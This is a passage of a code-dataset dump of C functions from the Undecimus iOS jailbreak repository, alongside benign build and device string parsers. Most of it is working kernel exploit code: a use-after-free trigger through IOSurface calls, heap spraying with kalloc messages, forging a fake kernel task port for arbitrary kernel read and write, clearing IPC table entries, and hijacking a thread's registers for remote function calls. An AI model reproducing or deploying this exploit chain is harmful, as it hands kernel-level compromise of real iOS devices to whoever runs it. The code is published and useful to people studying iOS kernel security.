MACH_PORT_NULL;\n            first_port = candidate_port;\n            first_port_address = candidate_address;\n            break;\n        }\n    }\n\n    if (first_port == MACH_PORT_NULL) {\n        LOG(\"unable to find a candidate port with a suitable page offset\");\n        return MACH_PORT_NULL;\n    }\n\n    uint64_t* context_ptr = NULL;\n    uint8_t* replacer_message_body = build_message_payload(first_port_address, replacer_body_size, message_body_offset, 0, 0, &context_ptr);\n    if (replacer_message_body == NULL) {\n        return MACH_PORT_NULL;\n    }\n    LOG(\"replacer_body_size: 0x%x\", replacer_body_size);\n    LOG(\"message_body_offset: 0x%x\", message_body_offset);\n\n    make_dangling(first_port);\n\n    free_ports(pre_ports, n_pre_ports);\n\n    // free the smaller ports, they will get gc'd later:\n    for (int i = 0; i < n_smaller_ports; i++) {\n        mach_port_destroy(mach_task_self(), smaller_ports[i]);\n    }\n\n    // now try to get that zone collected and reallocated as something controllable (kalloc.4096):\n\n    const int replacer_ports_limit = 200; // about 200 MB\n    mach_port_t replacer_ports[replacer_ports_limit];\n    memset(replacer_ports, 0, sizeof(replacer_ports));\n    uint32_t i;\n    for (i = 0; i < replacer_ports_limit; i++) {\n        uint64_t context_val = (context_magic) | i;\n        *context_ptr = context_val;\n        replacer_ports[i] = send_kalloc_message(replacer_message_body, replacer_body_size);\n        if (replacer_ports[i] == MACH_PORT_NULL) {\n            return MACH_PORT_NULL;\n        }\n\n        // we want the GC to actually finish, so go slow...\n        pthread_yield_np();\n        usleep(10000);\n        LOG(\"%d\", i);\n    }\n\n    // find out which replacer port it was\n    mach_port_context_t replacer_port_number = 0;\n    err = mach_port_get_context(mach_task_self(), first_port, &replacer_port_number);\n    if (err != KERN_SUCCESS) {\n        LOG(\"unable to get context: %d %s\", err, mach_error_string(err));\n        return MACH_PORT_NULL;\n    }\n    replacer_port_number &= 0xffffffff;\n    if (replacer_port_number >= (uint64_t)replacer_ports_limit) {\n        LOG(\"suspicious context value, something's wrong %lx\", replacer_port_number);\n        return MACH_PORT_NULL;\n    }\n\n    LOG(\"got replaced with replacer port %ld\", replacer_port_number);\n\n    prepare_rk_via_kmem_read_port(first_port);\n\n    uint64_t kernel_vm_map = find_kernel_vm_map(task_self);\n    if (kernel_vm_map == 0) {\n        return MACH_PORT_NULL;\n    }\n    LOG(\"found kernel vm_map: 0x%llx\", kernel_vm_map);\n\n    // now free first replacer and put a fake kernel task port there\n    // we need to do this becase the first time around we don't know the address\n    // of ipc_space_kernel which means we can't fake a port owned by the kernel\n    SafeFreeNULL(replacer_message_body);\n    replacer_message_body = build_message_payload(first_port_address, replacer_body_size, message_body_offset, kernel_vm_map, ipc_space_kernel(), &context_ptr);\n    if (replacer_message_body == NULL) {\n        return MACH_PORT_NULL;\n    }\n\n    // free the first replacer\n    mach_port_t replacer_port = replacer_ports[replacer_port_number];\n    replacer_ports[replacer_port_number] = MACH_PORT_NULL;\n    mach_port_destroy(mach_task_self(), replacer_port);\n\n    const int n_second_replacer_ports = 10;\n    mach_port_t second_replacer_ports[n_second_replacer_ports];\n\n    for (int i = 0; i < n_second_replacer_ports; i++) {\n        *context_ptr = i;\n        second_replacer_ports[i] = send_kalloc_message(replacer_message_body, replacer_body_size);\n        if (second_replacer_ports[i] == MACH_PORT_NULL) {\n            return MACH_PORT_NULL;\n        }\n    }\n\n    // hopefully that worked the second time too!\n    // check the context:\n\n    replacer_port_number = 0;\n    err = mach_port_get_context(mach_task_self(), first_port, &replacer_port_number);\n    if (err != KERN_SUCCESS) {\n        LOG(\"unable to get context: %d %s\", err, mach_error_string(err));\n        return MACH_PORT_NULL;\n    }\n\n    replacer_port_number &= 0xffffffff;\n    if (replacer_port_number >= (uint64_t)n_second_replacer_ports) {\n        LOG(\"suspicious context value, something's wrong %lx\", replacer_port_number);\n        return MACH_PORT_NULL;\n    }\n\n    LOG(\"second time got replaced with replacer port %ld\", replacer_port_number);\n\n    // clear up the original replacer ports:\n    for (int i = 0; i < replacer_ports_limit; i++) {\n        mach_port_destroy(mach_task_self(), replacer_ports[i]);\n    }\n\n    // then clear up the second replacer ports (apart from the one in use)\n    mach_port_t second_replacement_port = second_replacer_ports[replacer_port_number];\n    second_replacer_ports[replacer_port_number] = MACH_PORT_NULL;\n    for (int i = 0; i < n_second_replacer_ports; i++) {\n        mach_port_destroy(mach_task_self(), second_replacer_ports[i]);\n    }\n\n    LOG(\"will try to read from second port (fake kernel)\");\n    // try to read some kernel memory using the second port:\n    vm_offset_t data_out = 0;\n    mach_msg_type_number_t out_size = 0;\n    err = mach_vm_read(first_port, kernel_vm_map, 0x40, &data_out, &out_size);\n    if (err != KERN_SUCCESS) {\n        LOG(\"mach_vm_read failed: %x %s\", err, mach_error_string(err));\n        return MACH_PORT_NULL;\n    }\n\n    LOG(\"kernel read via fake kernel task port worked?\");\n    LOG(\"0x%016llx\", *(uint64_t*)data_out);\n    LOG(\"0x%016llx\", *(uint64_t*)(data_out + 8));\n    LOG(\"0x%016llx\", *(uint64_t*)(data_out + 0x10));\n    LOG(\"0x%016llx\", *(uint64_t*)(data_out + 0x18));\n\n    prepare_rwk_via_tfp0(first_port);\n    LOG(\"about to build safer tfp0\");\n\n    //early_kalloc(0x10000);\n    //return 0;\n\n    mach_port_t safer_tfp0 = build_safe_fake_tfp0(kernel_vm_map, ipc_space_kernel());\n    prepare_rwk_via_tfp0(safer_tfp0);\n\n    LOG(\"built safer tfp0\");\n    LOG(\"about to clear up\");\n\n    // can now clean everything up\n    WriteKernel32(first_port_address + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_BITS_ACTIVE | IKOT_NONE);\n    WriteKernel64(first_port_address + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), 0);\n\n    // first port will soon point to freed memory, so neuter it:\n    uint64_t task_port_addr = task_self_addr();\n    uint64_t task_addr = ReadKernel64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));\n    uint64_t itk_space = ReadKernel64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));\n    uint64_t is_table = ReadKernel64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));\n\n    uint32_t port_index = first_port >> 8;\n    const int sizeof_ipc_entry_t = 0x18;\n\n    // remove all rights\n    WriteKernel32(is_table + (port_index * sizeof_ipc_entry_t) + 8, 0);\n\n    // clear the ipc_port port too\n    WriteKernel64(is_table + (port_index * sizeof_ipc_entry_t), 0);\n\n    mach_port_destroy(mach_task_self(), second_replacement_port);\n    LOG(\"cleared up\");\n    return safer_tfp0;\n}", "path": "Undecimus/Undecimus/source/async_wake.c", "commit_date": "2019-05-14 00:00:00", "repo_name": "pwn20wndstuff/Undecimus", "stars": 6651, "license": "bsd-3-clause", "language": "c", "size": 433200}
{"docstring": "// Parse a device range string.\n", "func_signal": "static bool\nparse_device_range(const char *device, char *device_type,\n\t\tunsigned *min_major, unsigned *min_minor,\n\t\tunsigned *max_major, unsigned *max_minor,\n\t\tconst char **end)", "code": "{\n\tchar dev_type[32];\n\tconst char *next = device;\n\t// First parse a full device.\n\tbool ok = parse_device_internal(next, dev_type, min_major, min_minor, true, &next);\n\tif (!ok) {\nunknown:\n\t\tstrcpy(device_type, device);\n\t\t*min_major = 0;\n\t\t*min_minor = 0;\n\t\t*max_major = 0;\n\t\t*max_minor = 0;\n\t\treturn false;\n\t}\n\t// Optionally parse a separator and more versions.\n\tif (*next == 0) {\n\t\t*max_major = *min_major;\n\t\t*max_minor = *min_minor;\n\t} else if (*next == '-') {\n\t\tnext++;\n\t\tok = parse_device_version_internal(next, max_major, max_minor, true, &next);\n\t\tif (!ok) {\n\t\t\tgoto unknown;\n\t\t}\n\t}\n\t*end = next;\n\t// Return the device_type.\n\tstrcpy(device_type, dev_type);\n\treturn true;\n}", "path": "Undecimus/Undecimus/source/platform_match.c", "commit_date": "2019-01-30 00:00:00", "repo_name": "pwn20wndstuff/Undecimus", "stars": 6651, "license": "bsd-3-clause", "language": "c", "size": 433200}
{"docstring": "// get kernel address of IODTNVRAM object\n", "func_signal": "uint64_t get_iodtnvram_obj(void)", "code": "{\n    static uint64_t IODTNVRAMObj = 0;\n    \n    if (IODTNVRAMObj == 0) {\n        io_service_t IODTNVRAMSrv = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching(\"IODTNVRAM\"));\n        if (!MACH_PORT_VALID(IODTNVRAMSrv)) {\n            LOG(\"Failed to get IODTNVRAM service\");\n            return 0;\n        }\n        uint64_t nvram_up = get_address_of_port(proc_struct_addr(), IODTNVRAMSrv);\n        IODTNVRAMObj = ReadKernel64(nvram_up + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));\n\n        LOG(\"IODTNVRAM obj at 0x%llx\", IODTNVRAMObj);\n    }\n\n    return IODTNVRAMObj;\n}", "path": "Undecimus/Undecimus/source/unlocknvram.c", "commit_date": "2019-05-28 00:00:00", "repo_name": "pwn20wndstuff/Undecimus", "stars": 6651, "license": "bsd-3-clause", "language": "c", "size": 433200}
{"docstring": "// Parse a build version range string.\n", "func_signal": "static void\nparse_build_version_range(const char *builds, uint64_t *version_min, uint64_t *version_max)", "code": "{\n\tconst char *next = builds;\n\tuint64_t min, max;\n\t// Parse the lower range.\n\tif (*next == '*') {\n\t\tmin = 0;\n\t\tnext++;\n\t} else {\n\t\tmin = parse_build_version(next, &next);\n\t}\n\t// Parse the upper range (if it exists).\n\tif (*next == 0) {\n\t\tassert(min != 0);\n\t\tmax = min;\n\t} else {\n\t\tskip_spaces(&next);\n\t\tassert(*next == '-');\n\t\tnext++;\n\t\tskip_spaces(&next);\n\t\tif (*next == '*') {\n\t\t\tmax = (uint64_t)(-1);\n\t\t\tnext++;\n\t\t} else {\n\t\t\tmax = parse_build_version(next, &next);\n\t\t}\n\t\tassert(*next == 0);\n\t}\n\t*version_min = min;\n\t*version_max = max;\n}", "path": "Undecimus/Undecimus/source/platform_match.c", "commit_date": "2019-01-30 00:00:00", "repo_name": "pwn20wndstuff/Undecimus", "stars": 6651, "license": "bsd-3-clause", "language": "c", "size": 433200}
{"docstring": "// Parse a build version string into a uint64_t. Maintains comparison order.\n", "func_signal": "static uint64_t\nparse_build_version(const char *build, const char **end)", "code": "{\n\t// 16A5288q -> [2 bytes][1 byte][3 bytes][1 byte]\n\tconst char *p = build;\n\t// Parse out the major number.\n\tuint64_t major = 0;\n\tfor (;;) {\n\t\tchar ch = *p;\n\t\tif (ch < '0' || '9' < ch) {\n\t\t\tbreak;\n\t\t}\n\t\tmajor = major * 10 + (ch - '0');\n\t\tp++;\n\t}\n\t// Parse out the minor.\n\tuint64_t minor = 0;\n\tfor (;;) {\n\t\tchar ch = *p;\n\t\tif (ch < 'A' || 'Z' < ch) {\n\t\t\tbreak;\n\t\t}\n\t\tminor = (minor << 8) + ch;\n\t\tp++;\n\t}\n\t// Parse out the patch.\n\tuint64_t patch = 0;\n\tfor (;;) {\n\t\tchar ch = *p;\n\t\tif (ch < '0' || '9' < ch) {\n\t\t\tbreak;\n\t\t}\n\t\tpatch = patch * 10 + (ch - '0');\n\t\tp++;\n\t}\n\t// Parse out the alpha.\n\tuint64_t alpha = 0;\n\tfor (;;) {\n\t\tchar ch = *p;\n\t\tif (ch < 'a' || 'z' < ch) {\n\t\t\tbreak;\n\t\t}\n\t\talpha = (alpha << 8) + ch;\n\t\tp++;\n\t}\n\t// Construct the full build version.\n\tif (end != NULL) {\n\t\t*end = p;\n\t}\n\treturn ((major << (8 * 5))\n\t\t\t| (minor << (8 * 4))\n\t\t\t| (patch << (8 * 1))\n\t\t\t| (alpha << (8 * 0)));\n}", "path": "Undecimus/Undecimus/source/platform_match.c", "commit_date": "2019-01-30 00:00:00", "repo_name": "pwn20wndstuff/Undecimus", "stars": 6651, "license": "bsd-3-clause", "language": "c", "size": 433200}
{"docstring": "/*\n * the first tpf0 we get still hangs of the dangling port and is backed by a type-confused ipc_kmsg buffer\n *\n * use that tfp0 to build a safer one such that we can safely free everything this process created and exit\n * without leaking memory\n */\n", "func_signal": "mach_port_t build_safe_fake_tfp0(uint64_t vm_map, uint64_t space)", "code": "{\n    kern_return_t err;\n\n    mach_port_t tfp0 = MACH_PORT_NULL;\n    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &tfp0);\n    if (err != KERN_SUCCESS) {\n        LOG(\"unable to allocate port\");\n    }\n\n    // build a fake struct task for the kernel task:\n    //uint64_t fake_kernel_task_kaddr = kmem_alloc_wired(0x4000);\n    uint64_t fake_kernel_task_kaddr = early_kalloc(0x1000);\n    LOG(\"fake_kernel_task_kaddr: %llx\", fake_kernel_task_kaddr);\n\n    void* fake_kernel_task = malloc(0x1000);\n    memset(fake_kernel_task, 0, 0x1000);\n    *(uint32_t*)(fake_kernel_task + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT)) = 0xd00d; // leak references\n    *(uint32_t*)(fake_kernel_task + koffset(KSTRUCT_OFFSET_TASK_ACTIVE)) = 1;\n    *(uint64_t*)(fake_kernel_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP)) = vm_map;\n    *(uint8_t*)(fake_kernel_task + koffset(KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE)) = 0x22;\n    kmemcpy(fake_kernel_task_kaddr, (uint64_t)fake_kernel_task, 0x1000);\n    SafeFreeNULL(fake_kernel_task);\n\n    uint32_t fake_task_refs = ReadKernel32(fake_kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT));\n    LOG(\"read fake_task_refs: %x\", fake_task_refs);\n    if (fake_task_refs != 0xd00d) {\n        LOG(\"read back value didn't match...\");\n    }\n\n    // now make the changes to the port object to make it a task port:\n    uint64_t port_kaddr = find_port_address(tfp0, MACH_MSG_TYPE_MAKE_SEND);\n\n    WriteKernel32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_BITS_ACTIVE | IKOT_TASK);\n    WriteKernel32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES), 0xf00d);\n    WriteKernel32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS), 0xf00d);\n    WriteKernel64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), space);\n    WriteKernel64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), fake_kernel_task_kaddr);\n\n    // swap our receive right for a send right:\n    uint64_t task_port_addr = task_self_addr();\n    uint64_t task_addr = ReadKernel64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));\n    uint64_t itk_space = ReadKernel64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));\n    uint64_t is_table = ReadKernel64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));\n\n    uint32_t port_index = tfp0 >> 8;\n    const int sizeof_ipc_entry_t = 0x18;\n    uint32_t bits = ReadKernel32(is_table + (port_index * sizeof_ipc_entry_t) + 8); // 8 = offset of ie_bits in struct ipc_entry\n\n#define IE_BITS_SEND (1 << 16)\n#define IE_BITS_RECEIVE (1 << 17)\n\n    bits &= (~IE_BITS_RECEIVE);\n    bits |= IE_BITS_SEND;\n\n    WriteKernel32(is_table + (port_index * sizeof_ipc_entry_t) + 8, bits);\n\n    LOG(\"about to test new tfp0\");\n\n    vm_offset_t data_out = 0;\n    mach_msg_type_number_t out_size = 0;\n    err = mach_vm_read(tfp0, vm_map, 0x40, &data_out, &out_size);\n    if (err != KERN_SUCCESS) {\n        LOG(\"mach_vm_read failed: %x %s\", err, mach_error_string(err));\n        return MACH_PORT_NULL;\n    }\n\n    LOG(\"kernel read via second tfp0 port worked?\");\n    LOG(\"0x%016llx\", *(uint64_t*)data_out);\n    LOG(\"0x%016llx\", *(uint64_t*)(data_out + 8));\n    LOG(\"0x%016llx\", *(uint64_t*)(data_out + 0x10));\n    LOG(\"0x%016llx\", *(uint64_t*)(data_out + 0x18));\n\n    return tfp0;\n}", "path": "Undecimus/Undecimus/source/async_wake.c", "commit_date": "2019-05-14 00:00:00", "repo_name": "pwn20wndstuff/Undecimus", "stars": 6651, "license": "bsd-3-clause", "language": "c", "size": 433200}
{"docstring": "// make_dangling will drop an extra reference on port\n// this is the actual bug:\n", "func_signal": "void make_dangling(mach_port_t port)", "code": "{\n    kern_return_t err;\n\n    uint64_t inputScalar[16];\n    uint32_t inputScalarCnt = 0;\n\n    char inputStruct[4096];\n    size_t inputStructCnt = 0x18;\n\n    uint64_t* ivals = (uint64_t*)inputStruct;\n    ivals[0] = 1;\n    ivals[1] = 2;\n    ivals[2] = 3;\n\n    uint64_t outputScalar[16];\n    uint32_t outputScalarCnt = 0;\n\n    char outputStruct[4096];\n    size_t outputStructCnt = 0;\n\n    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);\n\n    uint64_t reference[8] = { 0 };\n    uint32_t referenceCnt = 1;\n\n    for (int i = 0; i < 2; i++) {\n        err = IOConnectCallAsyncMethod(\n            user_client,\n            17, // s_set_surface_notify\n            port,\n            reference,\n            referenceCnt,\n            inputScalar,\n            inputScalarCnt,\n            inputStruct,\n            inputStructCnt,\n            outputScalar,\n            &outputScalarCnt,\n            outputStruct,\n            &outputStructCnt);\n\n        LOG(\"%x\", err);\n    };\n\n    err = IOConnectCallMethod(\n        user_client,\n        18, // s_remove_surface_notify\n        inputScalar,\n        inputScalarCnt,\n        inputStruct,\n        inputStructCnt,\n        outputScalar,\n        &outputScalarCnt,\n        outputStruct,\n        &outputStructCnt);\n\n    LOG(\"%x\", err);\n}", "path": "Undecimus/Undecimus/source/async_wake.c", "commit_date": "2019-05-14 00:00:00", "repo_name": "pwn20wndstuff/Undecimus", "stars": 6651, "license": "bsd-3-clause", "language": "c", "size": 433200}
{"docstring": "// Parse the version part of a device string.\n", "func_signal": "static bool\nparse_device_version_internal(const char *device_version, unsigned *major, unsigned *minor,\n\t\tbool allow_wildcard, const char **end)", "code": "{\n\tconst char *p = device_version;\n\t// Parse the major version, which might be a wildcard.\n\tunsigned maj = 0;\n\tif (allow_wildcard && *p == '*') {\n\t\tmaj = ANY;\n\t\tp++;\n\t} else {\n\t\tfor (;;) {\n\t\t\tchar ch = *p;\n\t\t\tif (ch < '0' || '9' < ch) {\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tmaj = maj * 10 + (ch - '0');\n\t\t\tp++;\n\t\t}\n\t}\n\t// Make sure we got the comma.\n\tif (*p != ',') {\n\t\treturn false;\n\t}\n\tp++;\n\t// Parse the minor version, which might be a wildcard.\n\tunsigned min = 0;\n\tif (allow_wildcard && *p == '*') {\n\t\tmin = ANY;\n\t\tp++;\n\t} else {\n\t\tfor (;;) {\n\t\t\tchar ch = *p;\n\t\t\tif (ch < '0' || '9' < ch) {\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tmin = min * 10 + (ch - '0');\n\t\t\tp++;\n\t\t}\n\t}\n\t// If end is NULL, then require that we're at the end of the string. Else, return the end\n\t// of what we parsed.\n\tif (end == NULL) {\n\t\tif (*p != 0) {\n\t\t\treturn false;\n\t\t}\n\t} else {\n\t\t*end = p;\n\t}\n\t// Return the values.\n\t*major = maj;\n\t*minor = min;\n\treturn true;\n}", "path": "Undecimus/Undecimus/source/platform_match.c", "commit_date": "2019-01-30 00:00:00", "repo_name": "pwn20wndstuff/Undecimus", "stars": 6651, "license": "bsd-3-clause", "language": "c", "size": 433200}
{"docstring": "/* credits to ian beer */\n", "func_signal": "static mach_port_t send_kalloc_message(uint8_t *replacer_message_body, uint32_t replacer_body_size)", "code": "{\n    // allocate a port to send the messages to\n    mach_port_t q = MACH_PORT_NULL;\n    kern_return_t err;\n    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &q);\n    if (err != KERN_SUCCESS)\n    {\n        printf(\" [-] failed to allocate port\\n\");\n        exit(EXIT_FAILURE);\n    }\n    \n    mach_port_limits_t limits = {0};\n    limits.mpl_qlimit = MACH_PORT_QLIMIT_LARGE;\n    err = mach_port_set_attributes(mach_task_self(),\n                                   q,\n                                   MACH_PORT_LIMITS_INFO,\n                                   (mach_port_info_t)&limits,\n                                   MACH_PORT_LIMITS_INFO_COUNT);\n    if (err != KERN_SUCCESS)\n    {\n        printf(\" [-] failed to increase queue limit\\n\");\n        exit(EXIT_FAILURE);\n    }\n    \n    mach_msg_size_t msg_size = sizeof(struct simple_msg) + replacer_body_size;\n    struct simple_msg *msg = malloc(msg_size);\n    memset(msg, 0, sizeof(struct simple_msg));\n    memcpy(&msg->buf[0], replacer_message_body, replacer_body_size);\n    \n    for (int i = 0; i < 256; i++)\n    {\n        msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);\n        msg->hdr.msgh_size = msg_size;\n        msg->hdr.msgh_remote_port = q;\n        msg->hdr.msgh_local_port = MACH_PORT_NULL;\n        msg->hdr.msgh_id = 0x41414142;\n        \n        err = mach_msg(&msg->hdr,\n                       MACH_SEND_MSG|MACH_MSG_OPTION_NONE,\n                       msg_size,\n                       0,\n                       MACH_PORT_NULL,\n                       MACH_MSG_TIMEOUT_NONE,\n                       MACH_PORT_NULL);\n        \n        if (err != KERN_SUCCESS)\n        {\n            printf(\" [-] failed to send message %x (%d): %s\\n\", err, i, mach_error_string(err));\n            exit(EXIT_FAILURE);\n        }\n    }\n    \n    return q;\n}", "path": "Undecimus/Undecimus/source/kalloc_crash.c", "commit_date": "2019-05-13 00:00:00", "repo_name": "pwn20wndstuff/Undecimus", "stars": 6651, "license": "bsd-3-clause", "language": "c", "size": 433200}
{"docstring": "// ---- Initialization ----------------------------------------------------------------------------\n", "func_signal": "void\nplatform_init()", "code": "{\n\t// Only initialize once.\n\tstatic bool initialized = false;\n\tif (initialized) {\n\t\treturn;\n\t}\n\tinitialized = true;\n\t// Set the page size.\n\tplatform.page_size = vm_kernel_page_size;\n\tpage_size = platform.page_size;\n\t// Get the machine name (e.g. iPhone11,8).\n\tstruct utsname u = {};\n\tint error = uname(&u);\n\tassert(error == 0);\n\tstrncpy((char *)platform.machine, u.machine, sizeof(platform.machine));\n\t// Get the build (e.g. 16C50).\n\tsize_t osversion_size = sizeof(platform.osversion);\n\terror = sysctlbyname(\"kern.osversion\",\n\t\t\t(void *)platform.osversion, &osversion_size, NULL, 0);\n\tassert(error == 0);\n\t// Get basic host info.\n\tmach_port_t host = mach_host_self();\n\tassert(MACH_PORT_VALID(host));\n\thost_basic_info_data_t basic_info;\n\tmach_msg_type_number_t count = HOST_BASIC_INFO_COUNT;\n\tkern_return_t kr = host_info(host, HOST_BASIC_INFO, (host_info_t) &basic_info, &count);\n\tassert(kr == KERN_SUCCESS);\n\tplatform.cpu_type     = basic_info.cpu_type;\n\tplatform.cpu_subtype  = basic_info.cpu_subtype;\n\tplatform.physical_cpu = basic_info.physical_cpu;\n\tplatform.logical_cpu  = basic_info.logical_cpu;\n\tplatform.memory_size  = basic_info.max_mem;\n    INFO(\"memory_size: %zu\", platform.memory_size);\n\tmach_port_deallocate(mach_task_self(), host);\n\t// Log basic platform info.\n\tDEBUG_TRACE(1, \"platform: %s %s\", platform.machine, platform.osversion);\n}", "path": "Undecimus/Undecimus/source/platform.c", "commit_date": "2019-01-30 00:00:00", "repo_name": "pwn20wndstuff/Undecimus", "stars": 6651, "license": "bsd-3-clause", "language": "c", "size": 433200}
{"docstring": "// Check if the given build version string matches the build range.\n", "func_signal": "static bool\nmatch_build(const char *build, const char *builds)", "code": "{\n\tif (builds == NULL || strcmp(builds, \"*\") == 0) {\n\t\treturn true;\n\t}\n\tuint64_t version = parse_build_version(build, NULL);\n\tuint64_t version_min, version_max;\n\tparse_build_version_range(builds, &version_min, &version_max);\n\treturn (version_min <= version && version <= version_max);\n}", "path": "Undecimus/Undecimus/source/platform_match.c", "commit_date": "2019-01-30 00:00:00", "repo_name": "pwn20wndstuff/Undecimus", "stars": 6651, "license": "bsd-3-clause", "language": "c", "size": 433200}
{"docstring": "// thread should be suspended already; will return suspended\n", "func_signal": "uint64_t thread_call_remote(mach_port_t thread_port, void* fptr, int n_params, ...)", "code": "{\n#if __arm64e__\n    return 0;\n#else\n    if (n_params > MAX_REMOTE_ARGS || n_params < 0) {\n        LOG(\"unsupported number of arguments to remote function (%d)\", n_params);\n        return 0;\n    }\n\n    kern_return_t err;\n    //#if 0\n    // suspend the target thread we'll hijack:\n    err = thread_suspend(thread_port);\n    if (err != KERN_SUCCESS) {\n        LOG(\"failed to suspend the thread we're trying to hijack: %s\", mach_error_string(err));\n        return 0;\n    }\n    //#endif\n\n    // save its suspended state so we can restore it:\n    _STRUCT_ARM_THREAD_STATE64 saved_thread_state = { 0 };\n    mach_msg_type_number_t saved_thread_stateCnt = sizeof(saved_thread_state) / 4;\n    // LOG(\"saved thread state count before: %d\", saved_thread_stateCnt);\n    err = thread_get_state(thread_port, ARM_THREAD_STATE64, (thread_state_t)&saved_thread_state, &saved_thread_stateCnt);\n    if (err != KERN_SUCCESS) {\n        LOG(\"error getting thread state to save: %s\", mach_error_string(err));\n        return 0;\n    }\n\n    // dump the state:\n    //LOG(\"pc: 0x%016llx\", saved_thread_state.__pc);\n    //LOG(\"sp: 0x%016llx\", saved_thread_state.__sp);\n    //for (int i = 0; i < 29; i++) {\n    //  LOG(\"x%d: 0x%016llx\", i, saved_thread_state.__x[i]);\n    //}\n\n    // build the state we need for the arbitrary call:\n    _STRUCT_ARM_THREAD_STATE64 fcall_thread_state = { 0 };\n    mach_msg_type_number_t fcall_thread_stateCnt = sizeof(fcall_thread_state) / 4;\n    memcpy(&fcall_thread_state, &saved_thread_state, sizeof(fcall_thread_state));\n\n    // make sure we can determine when the function call is done\n    fcall_thread_state.__x[19] = find_blr_x19_gadget();\n    fcall_thread_state.__lr = find_blr_x19_gadget();\n\n    // set the pc\n    fcall_thread_state.__pc = (uint64_t)fptr;\n\n    // load the arguments\n    va_list ap;\n    va_start(ap, n_params);\n\n    arg_desc* args[MAX_REMOTE_ARGS] = { 0 };\n\n    for (int i = 0; i < n_params; i++) {\n        arg_desc* arg = va_arg(ap, arg_desc*);\n\n        args[i] = arg;\n\n        switch (arg->type) {\n        case ARG_LITERAL: {\n            //LOG(\"setting arg %d to literal %llx\", i, arg->value);\n            fcall_thread_state.__x[i] = arg->value;\n            break;\n        }\n#if 0\n            case ARG_BUFFER:\n            case ARG_BUFFER_PERSISTENT:\n            {\n                uint64_t remote_buffer = alloc_and_fill_remote_buffer(task_port, arg->value, arg->length);\n                remote_buffers[i] = remote_buffer;\n                thread_state.__x[i] = remote_buffer;\n                break;\n            }\n                \n            case ARG_OUT_BUFFER:\n            {\n                uint64_t remote_buffer = remote_alloc(task_port, arg->length);\n                LOG(\"allocated a remote out buffer: %llx\", remote_buffer);\n                remote_buffers[i] = remote_buffer;\n                thread_state.__x[i] = remote_buffer;\n                break;\n            }\n#endif\n        default: {\n            LOG(\"invalid argument type!\");\n        }\n        }\n    }\n\n    va_end(ap);\n#if 0\n    LOG(\"fcall thread state:\");\n    LOG(\"pc: 0x%016llx\", fcall_thread_state.__pc);\n    LOG(\"sp: 0x%016llx\", fcall_thread_state.__sp);\n    LOG(\"fp: 0x%016llx\", fcall_thread_state.__fp);\n    LOG(\"lr: 0x%016llx\", fcall_thread_state.__lr);\n    for (int i = 0; i < 29; i++) {\n        LOG(\"x%d: 0x%016llx\", i, fcall_thread_state.__x[i]);\n    }\n#endif\n\n    // set the thread state:\n    err = thread_set_state(thread_port, ARM_THREAD_STATE64, (thread_state_t)&fcall_thread_state, fcall_thread_stateCnt);\n    if (err != KERN_SUCCESS) {\n        LOG(\"error setting new thread state for hijacked thread: %s\", mach_error_string(err));\n        return 0;\n    }\n\n    // let the thread continue running with the new state:\n    err = thread_resume(thread_port);\n    if (err != KERN_SUCCESS) {\n        LOG(\"error resuming hijacked thread: %s\", mach_error_string(err));\n        return 0;\n    }\n    //LOG(\"resumed thread\");\n\n    // monitor for the function call ending and the thread hitting the infinite loop:\n    // we're reusing fcall state so we can also get the return value via x0\n    while (1) {\n        usleep(100 * 1000);\n        thread_suspend(thread_port);\n        err = thread_get_state(thread_port, ARM_THREAD_STATE64, (thread_state_t)&fcall_thread_state, &fcall_thread_stateCnt);\n        if (err != KERN_SUCCESS) {\n            LOG(\"error getting thread state: %s\", mach_error_string(err));\n            return 0;\n        }\n\n        thread_resume(thread_port);\n\n        if (fcall_thread_state.__pc == find_blr_x19_gadget()) {\n            // thread has returned from the target function\n            //LOG(\"hit looper!\");\n            break;\n        }\n        //LOG(\"got bad pc: 0x%llx\", fcall_thread_state.__pc);\n    }\n\n    uint64_t ret_val = fcall_thread_state.__x[0];\n\n    return ret_val;\n#endif\n}", "path": "Undecimus/Undecimus/source/remote_call.c", "commit_date": "2019-05-19 00:00:00", "repo_name": "pwn20wndstuff/Undecimus", "stars": 6651, "license": "bsd-3-clause", "language": "c", "size": 433200}
{"docstring": "// Advance past any spaces in a string.\n", "func_signal": "static void\nskip_spaces(const char **p)", "code": "{\n\tconst char *pch = *p;\n\twhile (*pch == ' ') {\n\t\tpch++;\n\t}\n\t*p = pch;\n}", "path": "Undecimus/Undecimus/source/platform_match.c", "commit_date": "2019-01-30 00:00:00", "repo_name": "pwn20wndstuff/Undecimus", "stars": 6651, "license": "bsd-3-clause", "language": "c", "size": 433200}
